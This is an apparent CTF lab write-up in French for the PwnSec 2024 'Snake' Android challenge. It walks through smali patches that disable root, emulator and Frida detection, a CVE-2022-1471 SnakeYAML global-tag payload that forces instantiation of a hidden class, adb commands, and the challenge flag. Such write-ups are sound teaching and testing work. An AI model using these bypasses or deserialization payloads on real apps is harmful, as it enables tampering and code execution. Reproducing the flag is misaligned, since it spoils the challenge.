# 🐍 Lab 19 : Snake — CTF Android Hard (CVE-2022-1471 SnakeYAML Deserialization)

## Repo Name : `android-security-lab19-snake-yaml-deserialization-ctf`

---

## Objectif

L'application Android utilise une version vulnérable de **SnakeYAML (1.33)** pour parser un fichier YAML. L'objectif est d'exploiter **CVE-2022-1471** (désérialisation unsafe) pour instancier la classe cachée `BigBoss`, déclencher une fonction JNI qui génère le flag et le récupérer via logcat.

- **Niveau :** Hard
- **CTF :** PwnSec CTF 2024 Mobile
- **Techniques :** Analyse statique (JADX + apktool), patch smali, CVE-2022-1471, Intent ADB, logcat

---

## Pourquoi Frida ne Fonctionne Pas Ici

Contrairement aux labs précédents, **Frida est inutilisable** à cause des protections natives :
- Détection de root → app se ferme immédiatement
- Détection d'émulateur → app se ferme immédiatement
- Détection de Frida (scan des processus/ports en C++) → app se ferme

**Solution obligatoire : patch statique de l'APK (smali)**

---

## Flux d'Exploitation

```
Snake.apk
      │
      ├── JADX → Identifier MainActivity + BigBoss + logique SNAKE Intent
      │
      ├── apktool d → Décompilation smali
      │
      ├── Patch smali → Bypasser root/émulateur/Frida détections
      │
      ├── apktool b + apksigner → Recompiler + signer
      │
      ├── adb push → Skull_Face.yml avec payload CVE-2022-1471
      │         !!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaaake"]
      │
      ├── adb shell am start → Intent -e SNAKE BigBoss
      │
      └── adb logcat → FLAG
```

---

## Étape 1 — Préparation de l'Environnement

```bash
# Installer l'APK original
adb install snake.apk
# L'app se ferme immédiatement → patch obligatoire
```

**Outils nécessaires :**

| Outil | Usage |
|-------|-------|
| JADX-GUI | Analyse Java |
| apktool | Décompilation/recompilation smali |
| apksigner | Signature de l'APK patché |
| Python 3 | (optionnel) |
| Émulateur Android | **API 28 ou inférieur recommandé** |

---

## Étape 2 — Analyse Statique avec JADX

```
1. Ouvrir Snake.apk dans JADX-GUI
2. Naviguer : com.pwnsec.snake → MainActivity
```

### Logique dans MainActivity

| Condition | Action |
|-----------|--------|
| Intent extra `SNAKE == "BigBoss"` | ✅ Déclenche la lecture du fichier YAML |
| Fichier `/sdcard/Snake/Skull_Face.yml` | Parsé avec SnakeYAML |
| Root / émulateur / Frida détecté | ❌ App se ferme immédiatement |

### Classe BigBoss (com.pwnsec.snake.BigBoss)

```java
public class BigBoss {
    static {
        System.loadLibrary("snake_native"); // charge la lib native
    }

    // Méthode cible de l'exploitation
    public BigBoss(String param) {
        if (param.equals("Snaaaaaaaaaaaaaake")) {
            String flag = stringFromJNI(); // génère le flag
            Log.d("SNAKE", flag);          // affiche dans logcat
        }
    }

    private native String stringFromJNI();
}
```

**Pourquoi cette conception :**
- `BigBoss` n'est **jamais instanciée** dans le flux normal
- CVE-2022-1471 permet de forcer l'instanciation via la désérialisation YAML
- La fonction native génère le flag dynamiquement → pas visible en clair dans l'APK

### Protections Observées

| Protection | Mécanisme |
|-----------|-----------|
| Anti-root | `Build.TAGS`, fichiers `su`, `/system/app/Superuser.apk` |
| Anti-émulateur | `ro.hardware`, `ro.product.model`, propriétés système |
| Anti-Frida | Scan des processus et ports dans la lib native |

---

## Étape 3 — Patch Smali : Bypasser les Détections

```bash
# Décompilation
apktool d snake.apk -o snake_smali

# Navigation
cd snake_smali/smali/com/pwnsec/snake/
```

### Méthode de Patch

**1. Localiser les méthodes de détection dans JADX :**
Rechercher les strings : `"root"`, `"su"`, `"emulator"`, `"frida"`, `"test-keys"`, `"Build.TAGS"`

**2. Dans les fichiers smali, patterns typiques :**

```smali
# Avant (check retourne true = détecté = app se ferme)
invoke-static {}, Lcom/pwnsec/snake/RootCheck;->isRooted()Z
move-result v0
if-nez v0, :cond_exit

# Patch Option A — Forcer retour false
const/4 v0, 0x0
return v0

# Patch Option B — Sauter le check
goto :cond_safe
```

**3. Vérifier toutes les classes de détection :**
- `RootCheck` ou similaire → forcer retour `false`
- `EmulatorCheck` ou similaire → forcer retour `false`
- Méthodes contenant `ptrace`, `frida`, `maps` → neutraliser

```bash
# Recompilation
apktool b snake_smali -o snake_patched.apk

# Signature
apksigner sign --ks ton_keystore.jks snake_patched.apk
# Ou avec le keystore de debug Android :
apksigner sign --ks "%USERPROFILE%\.android\debug.keystore" snake_patched.apk
# Mot de passe : android

# Installation
adb install -r snake_patched.apk

# Accorder les permissions
adb shell pm grant com.pwnsec.snake android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant com.pwnsec.snake android.permission.WRITE_EXTERNAL_STORAGE
```

> 💡 Faire des backups des fichiers smali avant modification — tester progressivement

---

## Étape 4 — Créer le Payload YAML (CVE-2022-1471)

```bash
# Créer le dossier sur l'appareil
adb shell mkdir -p /sdcard/Snake
```

**Contenu du fichier `Skull_Face.yml` :**
```yaml
!!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaaake"]
```

### Explication du Payload

| Élément | Description |
|---------|-------------|
| `!!com.pwnsec.snake.BigBoss` | Global tag YAML → force l'instanciation de la classe Java |
| `["Snaaaaaaaaaaaaaake"]` | Paramètre passé au constructeur (chaîne exacte requise) |
| CVE-2022-1471 | SnakeYAML 1.33 autorise la désérialisation arbitraire de classes |

> ⚠️ Ce comportement est corrigé dans SnakeYAML 2.0+ qui bloque l'instanciation arbitraire

```bash
# Transférer le payload sur l'appareil
adb push Skull_Face.yml /sdcard/Snake/Skull_Face.yml

# Vérifier
adb shell ls /sdcard/Snake/
```

---

## Étape 5 — Lancer l'App avec l'Intent Approprié

```bash
adb shell am start -n com.pwnsec.snake/.MainActivity -e SNAKE BigBoss
```

### Décomposition de la Commande

| Option | Valeur | Rôle |
|--------|--------|------|
| `-n com.pwnsec.snake/.MainActivity` | Classe cible | Démarre MainActivity |
| `-e SNAKE BigBoss` | Extra Intent | Satisfait la condition dans `onCreate` |

### Flux Déclenché

```
Intent reçu (SNAKE=BigBoss)
      ↓
Lecture /sdcard/Snake/Skull_Face.yml
      ↓
SnakeYAML.parse() → CVE-2022-1471
      ↓
new BigBoss("Snaaaaaaaaaaaaaake")
      ↓
stringFromJNI() → génère le flag
      ↓
Log.d("SNAKE", flag) → logcat
```

---

## Étape 6 — Récupérer le Flag via Logcat

```bash
# Filtre spécifique
adb logcat | grep -i "PWNSEC"

# Ou filtre plus large
adb logcat | grep -i "snake"

# Logcat en temps réel avec filtre
adb logcat -s "SNAKE"
```

---

## Flag

```
PWNSEC{W3'r3_N0t_T00l5_0f_The_g0v3rnm3n7_0R_4ny0n3_3ls3}
```

---

## Comparaison avec FireStorm (Lab 18)

| Aspect | FireStorm (Lab 18) | Snake (Lab 19) |
|--------|-------------------|----------------|
| Niveau | Medium | Hard |
| Frida | ✅ Utilisable | ❌ Bloqué par détections natives |
| Méthode | `Java.choose` + appel direct | Patch smali + CVE YAML |
| Vulnérabilité | Dead code (fonction inactive) | CVE-2022-1471 désérialisation |
| Flag | Firebase DB | logcat |
| APK modifié | Non | Oui (patch obligatoire) |

---

## CVE-2022-1471 — Résumé

| Propriété | Valeur |
|-----------|--------|
| CVE | CVE-2022-1471 |
| Bibliothèque | SnakeYAML < 2.0 (versions 1.x) |
| Type | Unsafe Deserialization |
| Impact | Exécution de code arbitraire via instanciation de classes Java |
| Correctif | SnakeYAML 2.0+ bloque `!!` global tags |

---

## Checklist de Résolution

- [ ] APK installé + comportement de fermeture confirmé
- [ ] JADX : `BigBoss`, `SNAKE` Intent, `Skull_Face.yml` identifiés
- [ ] Smali patché : root/émulateur/Frida détections neutralisées
- [ ] APK recompilé + signé + installé
- [ ] `Skull_Face.yml` créé avec payload CVE-2022-1471
- [ ] Intent envoyé via `adb shell am start -e SNAKE BigBoss`
- [ ] FLAG récupéré via `adb logcat | grep PWNSEC`

---

## Référence du Lab

- **Numéro du lab :** 19 (Sécurité Android)
- **Titre :** Snake — CTF Android Hard (CVE-2022-1471 SnakeYAML Deserialization)
- **CTF :** PwnSec CTF 2024 Mobile
- **Outils :** JADX-GUI, apktool, apksigner, ADB
- **Vulnérabilité :** CVE-2022-1471 (SnakeYAML unsafe deserialization)
- **Concepts clés :** Patch smali, Intent Android, désérialisation YAML, logcat, anti-debug bypass
